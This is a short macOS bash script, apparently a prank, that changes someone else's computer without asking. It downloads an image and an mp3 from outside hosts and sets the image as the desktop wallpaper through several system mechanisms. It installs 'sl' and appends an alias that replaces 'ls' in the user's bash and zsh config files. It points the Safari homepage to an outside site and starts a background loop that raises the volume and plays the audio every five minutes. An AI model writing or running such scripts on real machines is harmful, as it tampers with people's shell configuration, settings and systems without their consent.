#!/bin/bash
curl http://i.imgur.com/YQtjYcD.jpg > ~/Downloads/champ.jpg
HASHTAG=$HOME
CHAMP="$HASHTAG/Downloads/champ.jpg"
CENA=$CHAMP

if test -f ~/.bashrc; then
    brew install sl; echo "alias ls=sl" >> ~/.bashrc;
fi

if test -f ~/.zshrc; then
    brew install sl; echo "alias ls=sl" >> ~/.zshrc;
fi

defaults write com.apple.desktop Background '{default = {ImageFilePath = "'$CENA'"; }; }';
defaults write com.apple.Safari HomePage 'http://dank.city/'
osascript -e 'set THE CHAMP to POSIX file "'$CENA'"
tell application "System Events"
    set picture of every desktop to THE CHAMP
end tell'
sqlite3 ~/Library/Application\ Support/Dock/desktoppicture.db "update data set value = '~/Downloads/champ.jpg'";
killall Dock
curl http://dank.city/champ.mp3 > ~/Downloads/champ.mp3
while :; do sleep 300; osascript -e "set Volume 4"; afplay ~/Downloads/champ.mp3; done &
#    clear%
